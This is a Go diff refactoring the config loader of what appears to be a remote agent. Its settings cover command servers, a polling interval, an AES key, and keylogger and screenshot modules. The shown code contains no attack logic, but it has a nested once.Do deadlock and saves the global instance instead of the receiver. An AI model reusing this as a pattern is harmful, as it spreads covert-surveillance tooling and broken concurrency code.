@@ -1,87 +1,72 @@
 package config
 
 import (
-	"errors"
 	"fmt"
 	"gopkg.in/yaml.v3"
 	"os"
+	"path/filepath"
 	"sync"
 )
 
-type InstallationConfig struct {
-	DBPath     string `yaml:"DBPath"`
-	DBPassword string `yaml:"DBPassword"`
-	AESKey     string `yaml:"AESKey"`
-}
-
-type ServerConfig struct {
-	Address string `yaml:"Address"`
-	Port    int    `yaml:"Port"`
-	Key     string `yaml:"Key"`
-}
-
-type CommunicationConfig struct {
-	Interval    string         `yaml:"Interval"`
-	Servers     []ServerConfig `yaml:"Servers"`
-	Certificate string         `yaml:"Certificate"`
-}
-
-type AppsConfig struct {
-	Keylogger     map[string]any `yaml:"Keylogger,omitempty"`
-	Screenshot    map[string]any `yaml:"Screenshot,omitempty"`
-	SecurityGuard map[string]any `yaml:"SecurityGuard,omitempty"`
-}
-
 type Config struct {
-	AgentID       string              `yaml:"AgentID"`
-	Installation  InstallationConfig  `yaml:"Installation"`
-	Communication CommunicationConfig `yaml:"Communication"`
-	Apps          AppsConfig          `yaml:"Apps"`
+	AgentID        string              `yaml:"AgentID"`
+	Installation   InstallationConfig  `yaml:"Installation"`
+	Communication  CommunicationConfig `yaml:"Communication"`
+	Apps           AppsConfig          `yaml:"Apps"`
+	mu             sync.Mutex
+	configFilePath string
 }
 
 var (
 	instance *Config
 	once     sync.Once
-	mu       sync.Mutex
 )
 
-func LoadConfig(path string) (*Config, error) {
-	var loadError error
-
+func NewConfig(configFilePath string) *Config {
+	config := &Config{
+		mu:             sync.Mutex{},
+		configFilePath: configFilePath,
+	}
 	once.Do(func() {
-		data, readError := os.ReadFile(path)
+		data, readError := os.ReadFile(configFilePath)
 		if readError != nil {
-			loadError = fmt.Errorf("failed to read config file: %w", readError)
-			return
+			panic(fmt.Errorf("failed to read config file: %w", readError))
 		}
-		instance = &Config{}
-		if yamlError := yaml.Unmarshal(data, instance); yamlError != nil {
-			loadError = fmt.Errorf("failed to parse YAML: %w", yamlError)
-			return
+		if yamlError := yaml.Unmarshal(data, config); yamlError != nil {
+			panic(fmt.Errorf("failed to parse YAML: %w", yamlError))
 		}
 	})
-
-	return instance, loadError
+	return config
 }
 
-func GetConfig() (*Config, error) {
-	if instance == nil {
-		return nil, errors.New("config not initialized. Call LoadConfig first")
-	}
-	return instance, nil
+func GetInstance() *Config {
+	once.Do(func() {
+		configFilePath := GetConfigFilePath()
+		instance = NewConfig(configFilePath)
+	})
+	return instance
 }
 
-func SaveConfig(path string) error {
+func (cfg *Config) Save() error {
 	data, err := yaml.Marshal(instance)
 	if err != nil {
 		return err
 	}
-	return os.WriteFile(path, data, 0600)
+	return os.WriteFile(cfg.configFilePath, data, 0600)
 }
 
-func UpdateConfig(savePath string, updateFn func(c *Config)) error {
-	mu.Lock()
-	defer mu.Unlock()
+func (cfg *Config) Update(updateFn func(c *Config)) error {
+	cfg.mu.Lock()
+	defer cfg.mu.Unlock()
 	updateFn(instance)
-	return SaveConfig(savePath)
+	return cfg.Save()
+}
+
+func GetConfigFilePath() string {
+	currentDir, err := os.Getwd()
+	if err != nil {
+		panic(err)
+	}
+
+	return filepath.Join(currentDir, "config.yaml")
 }
